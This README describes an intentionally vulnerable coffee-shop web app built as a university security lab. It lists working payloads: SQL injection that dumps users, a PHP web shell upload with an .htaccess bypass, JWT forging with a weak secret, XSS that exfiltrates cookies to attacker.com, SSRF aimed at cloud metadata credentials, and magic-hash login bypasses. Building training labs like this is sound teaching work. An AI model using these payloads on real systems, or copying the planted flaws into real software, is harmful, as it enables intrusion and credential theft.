# ☕ Breuta Coffee Shop — Vulnerable Web Application Lab

> **Educational purpose only.** This application intentionally contains multiple security vulnerabilities for university security lab exercises.

---

## Architecture

| Component | Technology | Port |
|-----------|-----------|------|
| Web Server | Apache 2.4 + PHP 8.1 | 80 |
| API Backend | Flask (Python 3.11) | 5000 (internal) |
| Database | MySQL 5.7 | 3306 (internal) |

```
docker network: breuta_net
├── apache-main  (breuta.co, login.breuta.co)  → port 80
├── flask-api    (internal API)                 → port 5000
└── mysql-db     (database)                     → port 3306
```

---

## Quick Start

### 1. Prerequisites
- Docker + Docker Compose installed
- Port 80 available

### 2. First-time setup (add local DNS)
```bash
cd /home/jo/Desktop/web-lab
bash setup.sh
```
This adds `breuta.co` and `login.breuta.co` → `127.0.0.1` to `/etc/hosts`.

### 3. Start the lab
```bash
sudo docker compose up --build
```

### 4. Access the lab
| URL | Description |
|-----|-------------|
| http://breuta.co | Main coffee shop |
| http://breuta.co/shop/ | Product listing |
| http://breuta.co/vuln/sqli/ | SQLi Lab |
| http://breuta.co/vuln/upload/ | File Upload Lab |
| http://breuta.co/vuln/bola/ | BOLA Lab |
| http://breuta.co/vuln/bfla/ | BFLA Lab |
| http://breuta.co/vuln/xss/ | Stored XSS Lab |
| http://breuta.co/vuln/ssrf/ | SSRF Lab |
| http://breuta.co/vuln/bizlogic/ | Business Logic Lab |
| http://login.breuta.co/ | Employee Login (Type Juggling) |

---

## Vulnerability Details

### 1. 💉 SQL Injection — `/vuln/sqli/`
**Location:** `GET /vuln/sqli/?level=<payload>`

The roast level parameter is inserted directly into a raw SQL query:
```sql
SELECT roast_level AS level, name, origin, age_year AS age 
FROM products WHERE roast_level = <UNSANITIZED INPUT>
```

**Payloads:**
```
?level=1 UNION SELECT user,pass,NULL,NULL FROM users -- 
?level=1 OR 1=1 -- 
?level=1 UNION SELECT @@version,NULL,NULL,NULL -- 
```

**Expected output (with UNION payload):**
```json
{
  "level": 1,
  "name": "Ethiopian Yirgacheffe",
  "origin": "Ethiopia",
  "age": 2022
}
{
  "level": "anna",
  "name": "password123",
  "origin": null,
  "age": null
}
```

---

### 2. 📂 File Upload — `/vuln/upload/`
**Location:** `POST /vuln/upload/` → files served at `/shop/uploads/`

The server blocks `.php` extensions only (blacklist). Two attack paths:

**Path A — Extension bypass:**
```
Create: shell.lol
Content: <?php system($_GET['cmd']); ?>
Upload → GET /shop/uploads/shell.lol?cmd=id
```

**Path B — .htaccess RCE:**
```
Step 1: Upload .htaccess with content:
        AddType application/x-httpd-php .lol

Step 2: Upload shell.lol:
        <?php system($_GET['cmd']); ?>

Step 3: Access /shop/uploads/shell.lol?cmd=whoami
```

---

### 3. 🔓 BOLA — `/vuln/bola/`
**Location:** `GET /api/orders/<id>`

No ownership check — any authenticated user can read any order:
```bash
# Login as bob, read diana's order
curl http://breuta.co/api/orders/4 -H "Authorization: Bearer <BOB_TOKEN>"
```
Also vulnerable: `GET /api/users/<id>` and `PUT /api/users/<id>/balance`

---

### 4. 🛡️ BFLA — `/vuln/bfla/`
**Location:** Admin endpoints `/api/admin/*`

JWT secret is weak (`super_insecure_secret_123`). Forge an admin token:
```python
import jwt
token = jwt.encode(
    {"user_id": 3, "role": "admin", "exp": 9999999999},
    "super_insecure_secret_123",
    algorithm="HS256"
)
print(token)
```
Then:
```bash
curl http://breuta.co/api/admin/users -H "Authorization: Bearer <FORGED>"
curl -X PUT http://breuta.co/api/admin/users/3/role \
     -H "Authorization: Bearer <FORGED>" \
     -d '{"role":"admin"}'
```

---

### 5. 🧨 Stored XSS — `/vuln/xss/`
**Location:** Product review comment field

Comments are stored in DB and rendered without escaping:
```html
<!-- Payload examples -->
<script>alert('XSS by '+document.domain)</script>
<img src=x onerror="fetch('http://attacker.com/?c='+document.cookie)">
<svg onload="alert(document.cookie)">
```

---

### 6. 🌐 SSRF — `/vuln/ssrf/`
**Location:** `POST /api/fetch-preview`

No URL whitelist. Target internal services:
```bash
# AWS IMDSv1
{"url": "http://169.254.169.254/latest/meta-data/"}
{"url": "http://169.254.169.254/latest/meta-data/iam/security-credentials/"}

# Internal Flask API (bypasses auth)
{"url": "http://flask-api:5000/api/admin/users"}

# Internal MySQL
{"url": "http://mysql-db:3306/"}
```

---

### 7. 💼 Business Logic — `/vuln/bizlogic/`
**Vulnerabilities:**

| Flaw | Method |
|------|--------|
| Infinite coupon reuse | `{"coupon_code":"FREECOFFEE"}` — usage_count never updated |
| Negative quantity | `{"quantity": -5}` — creates negative total (money back) |
| Race condition | 10 parallel requests with same coupon before counter updates |

---

### 8. 👤 PHP Type Juggling — `http://login.breuta.co/`
**Location:** Employee login form

PHP compares MD5 hashes with `==` (loose comparison):
```php
// Vulnerable code:
if ($employee['password_hash'] == md5($password)) { ... }
```

Stored hash: `0e462097431906509019562988736854` (MD5 of `240610708`)

**Bypass credentials:**

| Username | Password | Why it works |
|----------|----------|--------------|
| `admin_emp` | `QNKCDZO` | md5 = `0e830...` → 0 == 0 |
| `admin_emp` | `240610708` | md5 = `0e460...` → 0 == 0 |
| `admin_emp` | `aabC9RqS` | md5 = `0e927...` → 0 == 0 |

---

## Test Credentials

### Customer accounts
| Username | Password | Role |
|----------|----------|------|
| `bob_smith` | `coffee2024` | customer |
| `charlie` | `latte_lover` | customer |
| `diana_w` | `espresso99` | customer |

### Employee accounts
| Username | Password (actual) | Role |
|----------|-------------------|------|
| `admin_emp` | `240610708` (or use magic hash) | manager |
| `barista01` | `brewtiful` | barista |

---

## Directory Structure

```
web-lab/
├── docker-compose.yml
├── setup.sh
├── services/
│   ├── apache-main/
│   │   ├── Dockerfile
│   │   ├── conf/
│   │   │   ├── breuta.co.conf          # Main vhost
│   │   │   └── login.breuta.co.conf    # Employee subdomain
│   │   └── html/
│   │       ├── index.php               # Homepage
│   │       ├── includes/               # Shared PHP includes
│   │       ├── assets/                 # CSS, JS
│   │       ├── shop/
│   │       │   ├── index.php           # Product listing
│   │       │   ├── cart/               # Shopping cart
│   │       │   ├── orders/             # Order history
│   │       │   └── uploads/            # File upload dir (writable)
│   │       ├── employees/
│   │       │   ├── index.php           # Type juggling login
│   │       │   └── dashboard.php       # Post-login dashboard
│   │       └── vuln/
│   │           ├── sqli/               # SQL Injection
│   │           ├── upload/             # File Upload
│   │           ├── bola/               # BOLA
│   │           ├── bfla/               # BFLA
│   │           ├── xss/                # Stored XSS
│   │           ├── ssrf/               # SSRF
│   │           └── bizlogic/           # Business Logic
│   ├── flask-api/
│   │   ├── Dockerfile
│   │   ├── requirements.txt
│   │   └── app.py                      # All API vulnerabilities
│   └── mysql/
│       └── init/
│           └── 01-schema.sql           # DB schema + seed data
```

---

## Stopping the Lab
```bash
sudo docker compose down         # Stop containers
sudo docker compose down -v      # Stop + remove volumes (reset DB)
```
